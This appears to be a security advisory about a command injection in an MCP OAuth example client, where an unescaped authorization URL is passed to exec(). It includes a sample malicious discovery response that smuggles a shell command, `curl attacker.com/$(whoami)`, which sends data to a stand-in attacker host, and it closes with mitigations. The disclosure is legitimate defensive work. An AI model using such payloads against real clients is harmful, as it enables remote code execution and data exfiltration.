# RCE via OAuth authorization_endpoint + exec() Command Injection

## Vulnerability Summary

The **mcp-with-auth example** implements `redirectToAuthorization()` using `exec(cmd)` with the OAuth `authorizationUrl` embedded in the shell command **without escaping**:

```typescript
const cmd = process.platform === 'darwin'
  ? `open "${authorizationUrl.toString()}"`
  : `xdg-open "${authorizationUrl.toString()}"`;
exec(cmd, ...);
```

The `authorizationUrl` comes from **OAuth discovery** (`metadata.authorization_endpoint`). Combined with the **SSRF/discovery vulnerability** (attacker controls discovery), a malicious `authorization_endpoint` can include shell metacharacters → **command injection → RCE**.

**Severity**: Critical (RCE, chains with OAuth discovery SSRF)  
**Location**: `examples/mcp/src/mcp-with-auth/client.ts`

## Affected Files

- `examples/mcp/src/mcp-with-auth/client.ts` lines 40–53
- Any app that copies this pattern for opening OAuth URLs

## Root Cause

1. Attacker controls OAuth discovery (via SSRF / malicious MCP server)
2. Discovery returns `authorization_endpoint: "https://x\"; id #"`
3. App builds: `open "https://x"; id #"`
4. Shell runs `id` → RCE

## Exploitation

Requires the OAuth discovery vulnerability (attacker-controlled discovery URLs). Malicious discovery returns:
```json
{
  "authorization_endpoint": "https://evil.com\"; curl attacker.com/$(whoami) #"
}
```
→ Command injection when app opens the URL.

## Mitigation

- Use `child_process.spawn()` with args array (no shell)
- Or proper escaping of URL before embedding in shell command
- Fix OAuth discovery to validate/restrict URLs
